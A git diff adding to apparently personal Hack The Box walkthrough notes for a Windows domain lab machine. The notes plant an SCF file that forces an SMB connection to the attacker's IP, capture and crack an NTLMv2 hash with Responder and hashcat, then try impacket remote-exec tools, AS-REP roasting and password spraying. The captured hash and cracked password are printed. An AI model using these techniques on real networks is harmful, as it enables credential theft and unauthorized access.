@@ -135,4 +135,83 @@ mount -t cifs "//10.10.10.103/Department Shares" /mnt/tmp
 ```bash
 find . -type d | while read directory; do touch ${directory}/kali 2>/dev/null && echo "${directory} - write file" && rm ${directory}/kali; mkdir ${directory}/kali 2>/dev/null && echo "${directory} - write directory" && rmdir ${directory}/kali; done
 ```
+- Found write access
+```
+./Users/Public - write file
+./Users/Public - write directory
+./ZZ_ARCHIVE - write file
+./ZZ_ARCHIVE - write directory
+```
+- Looks like there is user interaction where files on users/public are removed every 4 minutes
+- There is a way to exploit and open an smb connection every time a user visits a directory in file explorer SCF FILE ATTACK
+- dropping payload.scf in zzarchive and /users/public
+	- Content
+```
+[Shell]
+Command=2
 
+IconFile=\\10.10.14.13\icon
+```
+- Running the responder on tun0
+```bash
+sudo responder -I tun0
+```
+- Waiting for a hit 
+- Got amanda!
+```
+[SMB] NTLMv2-SSP Client   : 10.10.10.103
+[SMB] NTLMv2-SSP Username : HTB\amanda
+[SMB] NTLMv2-SSP Hash     : amanda::HTB:4f9be7f328781f11:C3BAA81E7AFB3173AFD561F133307C34:01010000000000008062BDFF327DDB01A7E58529AA829D7000000000020008004F0042003600390001001E00570049004E002D0036004900410059004A0054004E0035004E0059004A0004003400570049004E002D0036004900410059004A0054004E0035004E0059004A002E004F004200360039002E004C004F00430041004C00030014004F004200360039002E004C004F00430041004C00050014004F004200360039002E004C004F00430041004C00070008008062BDFF327DDB01060004000200000008003000300000000000000001000000002000003F3FF11A9CA02C961743E14D05AAED3F95EAF5838165F457C8233498422325540A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003300000000000000000000000000 
+```
+- Cracking the hash first saved ad amanda-ntlmv2
+```bash
+hashcat -m 5600 amanda-ntlmv2 /usr/share/wordlists/rockyou.txt --force
+```
+- Got the password
+```
+amanda:Ashare1972
+```
+- Trying evil-winrm
+```bash
+evil-winrm -u amanda -p Ashare1972 -i 10.10.10.103
+```
+- No luck
+- trying the execs from impacket
+```bash
+impacket-smbexec -dc-ip 10.10.10.103 htb.local/amanda:Ashare1972@10.10.10.103
+```
+```bash
+impacket-psexec -dc-ip 10.10.10.103 htb.local/amanda:Ashare1972@10.10.10.103
+```
+```
+impacket-wmiexec -dc-ip 10.10.10.103 htb.local/amanda:Ashare1972@10.10.10.103
+```
+- No luck
+- Trying nxc with amanda's creds
+```bash
+nxc smb 10.10.10.103 -d htb.local -u amanda -p Ashare1972 -M spider_plus
+```
+- Looks like there is stuff in SYSVOL and CertEnroll worth looking at
+```bash
+smbclient -U htb.local\\amanda //10.10.10.103/sysvol
+```
+- No access to DfsrPrivate
+- got some certificate files in certenroll
+- found some more users with nxc
+```bash
+nxc smb 10.10.10.103 -d htb.local -u amanda -p Ashare1972 --users
+```
+- looking for asreproastable npusers with amanda's creds
+```bash
+impacket-GetNPUsers -dc-ip 10.10.10.103 htb.local/ -usersfile users.txt -format hashcat -outputfile hashes_domain.txt
+```
+- No output
+- Going to password spray with amanda's password to see if there is a repeated password
+- Nope
+- These were in the http 80 feroxbuster output
+```
+403      GET       29l       92w     1233c http://10.10.10.103/certenroll/
+401      GET       29l      100w     1293c http://10.10.10.103/certsrv
+```
+- Amanda's creds worked for the login
+- 
